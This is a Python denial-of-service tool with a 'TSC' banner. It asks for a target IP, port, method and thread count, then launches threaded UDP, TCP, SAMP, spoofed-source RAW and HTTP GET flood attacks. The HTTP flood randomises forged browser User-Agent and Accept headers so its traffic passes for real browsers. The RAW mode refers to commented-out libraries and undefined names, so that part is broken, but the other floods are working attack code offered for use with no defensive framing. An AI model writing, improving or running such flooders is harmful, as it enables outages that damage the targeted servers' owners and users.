#!/usr/bin/env python3

import random
import socket
import threading
import time
import os
from os import system, name
import codecs,sys
import string
#from scapy.all import *
#from impacket import ImpactDecoder, ImpactPacket
import datetime

###############################
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
###################################################
Intn = random.randint
Choice1 = random.choice
##############################################
acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]


def getuseragent():
	platform = Choice1(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice1(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice1(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice1(['Linux i686', 'Linux x86_64'])
	browser = Choice1(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice1([True, False])
		if option == True:
			token = Choice1(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def UDP():
	data = random._urandom(65500)
	print(f"{bcolors.OKGREEN}ATTACK {bcolors.OKCYAN}{ip}{bcolors.WARNING}:{bcolors.OKCYAN}{port} {bcolors.OKGREEN}BY PACKET {bcolors.WARNING}UDP {bcolors.OKGREEN}FLOOD")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			#s.settimeout(100000)
			s.sendto(data,addr)
		except:
			clear()
			MainInput()


def RAW():
    while True:
        h1 = random.randint(30, 250)
        h2 = random.randint(100, 255)
        h3 = random.randint(1, 252)
        h4 = random.randint(3, 250)
        src = f"{h1}.{h2}.{h3}.{h4}"    
        ip = ImpactPacket.IP()
        ip.set_ip_src(src)
        ip.set_ip_dst(dst)


        icmp = ImpactPacket.ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)

        icmp.contains(ImpactPacket.Data(random._urandom(1024)))
        ip.contains(icmp)
        n = 0
        data = random._urandom(1024)
        while True:
            print("Spoofing from %s" % src)

            p1=IP(dst=ip,src=src)/TCP(dport=port,sport=5000,flags='S')
            send(p1)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            icmp.set_icmp_id(1)
            icmp.set_icmp_cksum(0)
            icmp.auto_checksum = 0
            s.sendto(ip.get_packet(), (dst, port))

            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ddos.connect((ip, port))
            ddos.send("GET / HTTP/1.1\r\n"+ data)


def SAMP():
	data = random._urandom(1024)
	print(f"{bcolors.OKGREEN}ATTACK {bcolors.OKCYAN}{ip}{bcolors.WARNING}:{bcolors.OKCYAN}{port} {bcolors.OKGREEN}BY PACKET {bcolors.WARNING}SAMP")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			#s.settimeout(100000)
			s.sendto(data,addr)
		except:
			clear()
			MainInput()

def TCP():
	data = random._urandom(1024)
	print(f"{bcolors.OKGREEN}ATTACK {bcolors.OKCYAN}{ip}{bcolors.WARNING}:{bcolors.OKCYAN}{port} {bcolors.OKGREEN}BY PACKET {bcolors.WARNING}TCP {bcolors.OKGREEN}FLOOD")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            #s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
			addr = (str(ip),int(port))
			#s.settimeout(1)
			s.connect((ip,port))
			s.send(data)
		except:
			clear()
			MainInput()

def randomurl():
	return str(Intn(0,271400281257))#less random, more performance

def HTTP():
	print(f"{bcolors.OKGREEN}ATTACK {bcolors.OKCYAN}{ip}{bcolors.WARNING}:{bcolors.OKCYAN}{port} {bcolors.OKGREEN}BY PACKET {bcolors.WARNING}HTTP {bcolors.OKGREEN}FLOOD")
	while True:
		try:
			httpss = Choice1(['1.1', '1.2', '1.3'])
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			connection = "Connection: Keep-Alive\r\n"
			accept = Choice1(acceptall)
			referer = "Referer: http://"+ ip+"/ \r\n"
			useragent = "User-Agent: " + getuseragent() + "\r\n"
			header =  referer + useragent + accept + connection + "\r\n"
			hd =  "GET /?"+randomurl()+" HTTP/"+httpss+"\r\nHost: "+ip+"\r\n"
			req =  hd + header
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			#s.settimeout(1000)
			s.connect((ip,port))
			for Y in range(times):
				s.send(str.encode(req))
		except:
			clear()
			MainInput()


def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')


def MainInput():
	global ip, port, choice, times
	main = str(input(f"{bcolors.OKGREEN}╚════════{bcolors.OKCYAN}(TSC]{bcolors.OKGREEN}════{bcolors.FAIL}> {bcolors.OKCYAN}:{bcolors.WARNING}"))
	clear()
	MainLogo()
	ip = str(input(f"{bcolors.OKGREEN}╚════════{bcolors.OKCYAN}(@IP]{bcolors.OKGREEN}════{bcolors.FAIL}> {bcolors.OKCYAN}:{bcolors.WARNING}"))
	clear()
	MainLogo()
	port = int(input(f"{bcolors.OKGREEN}╚════════{bcolors.OKCYAN}@PORT]{bcolors.OKGREEN}════{bcolors.FAIL}> {bcolors.OKCYAN}:{bcolors.WARNING}"))
	clear()
	MainLogo()
	choice = str(input(f"{bcolors.OKGREEN}╚════════{bcolors.OKCYAN}@METHOD]{bcolors.OKGREEN}════{bcolors.FAIL}> {bcolors.OKCYAN}:{bcolors.WARNING}"))
	clear()
	MainLogo()
	times = int(input(f"{bcolors.OKGREEN}╚════════{bcolors.OKCYAN}@TIME]{bcolors.OKGREEN}════{bcolors.FAIL}> {bcolors.OKCYAN}:{bcolors.WARNING}"))
	clear()

kuy="""
      ###################### 
     #                  ##
    ########      #######
          #      #  _________   ______
         #      #  |   ______| |  ____|
        #      #   |_______  | | |____
       #      #	   |_________| |______|
      #      #	

	(Method)
	• ─────────────────────────────────── •
	    LAYER4 - UDP, TCP, SAMP, RAW, HTTP
	• ─────────────────────────────────── •

"""

def MainLogo():
	print(bcolors.OKGREEN + kuy)

if __name__ == '__main__':
	clear()
	MainLogo()
	MainInput()
	if choice == 'udp' or choice == 'UDP':
		for Y in range(times):
			th = threading.Thread(target = UDP)
			th.start()
	if choice == 'tcp' or choice == 'TCP':
		for Y in range(times):
			th = threading.Thread(target = TCP)
			th.start()
	if choice == 'samp' or choice == 'SAMP':
		for Y in range(times):
			th = threading.Thread(target = SAMP)
			th.start()
	if choice == 'raw' or choice == 'RAW':
		for Y in range(times):
			th = threading.Thread(target = RAW)
			th.start()
	if choice == 'http' or choice == 'HTTP':
		for Y in range(times):
			th = threading.Thread(target = HTTP)
			th.start()